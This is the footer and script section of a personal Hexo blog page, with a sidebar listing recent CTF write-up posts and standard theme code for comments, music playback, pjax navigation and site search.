class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/13/TGCTF%20Writeup/" title="TGCTF 2025 WriteUp"><img src="/resources/images/ArticleTopImages/TGCTF2025.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TGCTF 2025 WriteUp"/></a><div class="content"><a class="title" href="/2025/04/13/TGCTF%20Writeup/" title="TGCTF 2025 WriteUp">TGCTF 2025 WriteUp</a><time datetime="2025-04-12T16:00:00.000Z" title="Created 2025-04-13 00:00:00">2025-04-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/14/%E6%A0%A1%E5%9B%AD%E7%BD%91/" title="实现 srun 校园网的远程认证登录"><img src="/resources/images/ArticleTopImages/srun_Yoruko.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实现 srun 校园网的远程认证登录"/></a><div class="content"><a class="title" href="/2025/03/14/%E6%A0%A1%E5%9B%AD%E7%BD%91/" title="实现 srun 校园网的远程认证登录">实现 srun 校园网的远程认证登录</a><time datetime="2025-03-13T16:00:00.000Z" title="Created 2025-03-14 00:00:00">2025-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/03/02/2025-03%20Writeup/" title="贰零贰伍年叁月·散装刷题月记"><img src="/resources/images/ArticleTopImages/2025_03_Konron.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="贰零贰伍年叁月·散装刷题月记"/></a><div class="content"><a class="title" href="/2025/03/02/2025-03%20Writeup/" title="贰零贰伍年叁月·散装刷题月记">贰零贰伍年叁月·散装刷题月记</a><time datetime="2025-03-01T16:00:00.000Z" title="Created 2025-03-02 00:00:00">2025-03-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/10/HGAME%202025%20WriteUp/" title="HGAME 2025 WriteUp"><img src="/resources/images/ArticleTopImages/HGAME2025.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HGAME 2025 WriteUp"/></a><div class="content"><a class="title" href="/2025/02/10/HGAME%202025%20WriteUp/" title="HGAME 2025 WriteUp">HGAME 2025 WriteUp</a><time datetime="2025-02-09T16:00:00.000Z" title="Created 2025-02-10 00:00:00">2025-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/03/2025-02%20WriteUp/" title="贰零贰伍年贰月·散装刷题月记"><img src="/resources/images/ArticleTopImages/2025-02.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="贰零贰伍年贰月·散装刷题月记"/></a><div class="content"><a class="title" href="/2025/02/03/2025-02%20WriteUp/" title="贰零贰伍年贰月·散装刷题月记">贰零贰伍年贰月·散装刷题月记</a><time datetime="2025-02-02T16:00:00.000Z" title="Created 2025-02-03 00:00:00">2025-02-03</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By k0relapse</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://vercel.k0re.xyz/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(res => {
+      countELement.textContent = res[0].count
+    }).catch(err => {
+      console.error(err)
+    })
+  }
+
+  const init = (el = document, path = location.pathname) => {
+    twikoo.init({
+      el: el.querySelector('#twikoo-wrap'),
+      envId: 'https://vercel.k0re.xyz/',
+      region: '',
+      onCommentLoaded: () => {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      },
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+
+    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
+      if (el.children.length) {
+        el.innerHTML = ''
+        el.classList.add('no-comment')
+      }
+    })
+  }
+
+  const loadTwikoo = (el, path) => {
+    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
+    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Twikoo'
+      ? window.shuoshuoComment = { loadComment: loadTwikoo }
+      : window.loadOtherComment = loadTwikoo
+    return
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = {"placeholder":"写点什么上来吧,也许会有有趣的事情发生哦( •̀ ω •́ )✧"}
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'nxcyV1X6p0KVm6cM1TX4gaQ1-gzGzoHsz',
+      appKey: '74WbkCQcPlGGjIooK165lk7g',
+      avatar: 'hide',
+      serverURLs: '',
+      emojiMaps: {"1":"https://k0re.xyz/emoji/emoji001.webp","2":"https://k0re.xyz/emoji/emoji002.webp","3":"https://k0re.xyz/emoji/emoji003.webp","4":"https://k0re.xyz/emoji/emoji004.webp","5":"https://k0re.xyz/emoji/emoji005.webp","6":"https://k0re.xyz/emoji/emoji006.webp","7":"https://k0re.xyz/emoji/emoji007.webp","8":"https://k0re.xyz/emoji/emoji008.webp","9":"https://k0re.xyz/emoji/emoji009.webp","10":"https://k0re.xyz/emoji/emoji010.webp","11":"https://k0re.xyz/emoji/emoji011.webp","12":"https://k0re.xyz/emoji/emoji012.webp","13":"https://k0re.xyz/emoji/emoji013.webp","14":"https://k0re.xyz/emoji/emoji014.webp","15":"https://k0re.xyz/emoji/emoji015.webp","16":"https://k0re.xyz/emoji/emoji016.webp","17":"https://k0re.xyz/emoji/emoji017.webp","18":"https://k0re.xyz/emoji/emoji018.webp","19":"https://k0re.xyz/emoji/emoji019.webp","20":"https://k0re.xyz/emoji/emoji020.webp","21":"https://k0re.xyz/emoji/emoji021.webp","22":"https://k0re.xyz/emoji/emoji022.webp","23":"https://k0re.xyz/emoji/emoji023.webp","24":"https://k0re.xyz/emoji/emoji024.webp","25":"https://k0re.xyz/emoji/emoji025.gif","26":"https://k0re.xyz/emoji/emoji026.gif","27":"https://k0re.xyz/emoji/emoji027.gif","28":"https://k0re.xyz/emoji/emoji028.gif","29":"https://k0re.xyz/emoji/emoji029.gif","30":"https://k0re.xyz/emoji/emoji030.gif","31":"https://k0re.xyz/emoji/emoji031.gif","32":"https://k0re.xyz/emoji/emoji032.gif","33":"https://k0re.xyz/emoji/emoji033.gif","34":"https://k0re.xyz/emoji/emoji034.gif","35":"https://k0re.xyz/emoji/emoji035.gif","36":"https://k0re.xyz/emoji/emoji036.gif","37":"https://k0re.xyz/emoji/emoji037.webp","38":"https://k0re.xyz/emoji/emoji038.webp","39":"https://k0re.xyz/emoji/emoji039.webp","40":"https://k0re.xyz/emoji/emoji040.webp","41":"https://k0re.xyz/emoji/emoji041.webp","42":"https://k0re.xyz/emoji/emoji042.webp","43":"https://k0re.xyz/emoji/emoji043.webp","44":"https://k0re.xyz/emoji/emoji044.webp","45":"https://k0re.xyz/emoji/emoji045.webp","46":"https://k0re.xyz/emoji/emoji046.webp","47":"https://k0re.xyz/emoji/emoji047.webp","48":"https://k0re.xyz/emoji/emoji048.webp","49":"https://k0re.xyz/emoji/emoji049.webp","50":"https://k0re.xyz/emoji/emoji050.webp","51":"https://k0re.xyz/emoji/emoji051.webp","52":"https://k0re.xyz/emoji/emoji052.webp","53":"https://k0re.xyz/emoji/emoji053.webp","54":"https://k0re.xyz/emoji/emoji054.webp","55":"https://k0re.xyz/emoji/emoji055.webp","56":"https://k0re.xyz/emoji/emoji056.webp","57":"https://k0re.xyz/emoji/emoji057.webp","58":"https://k0re.xyz/emoji/emoji058.webp","59":"https://k0re.xyz/emoji/emoji059.webp"},
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Twikoo' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Twikoo' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async src="/js/diytitle.js"></script><script src="https://libs.baidu.com/jquery/2.1.1/jquery.min.js"></script><script type="text/javascript" src="/js/sakura.js"></script><script async data-pjax src="/js/anzhiyu.js"></script><script async data-pjax src="/js/anzhiyuFunction.js"></script><script async src="/js/anzhiyuOnlyone.js"></script><script src="/js/randomTopImg.js"></script><script data-pjax>randomPic()</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="御桜稟,夏目雫,草薙直哉,川内野优美,冰川里奈,鸟谷真琴,草薙健一郎,夏目蓝,夏目水菜,夏目圭,中村章一,明石亘,托马斯,弗里德曼,明石小沙智,明石小牧,草薙水菜,吹,长山香奈,柊乃乃未,咲崎桜子,栗山奈津子,本间心铃,鸟谷静流,中村丽华,冰川露莉莴,川内野铃菜,恩田宁,恩田放哉,本间礼次郎,宫崎破戒,坂本彰三,村田清彦,片贝巧实,夏目依瑠,恩田雾乃" data-fontsize="20px" data-random="true" async="async"></script><link rel="stylesheet" href="https://k0re.xyz/css/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://k0re.xyz/js/APlayer.min.js"></script><script src="https://k0re.xyz/js/Meting2.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="快！让我访问！" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><div id="nav-music"><div id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()">播放音乐</div><meting-js id="12881846957" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div></body></html>
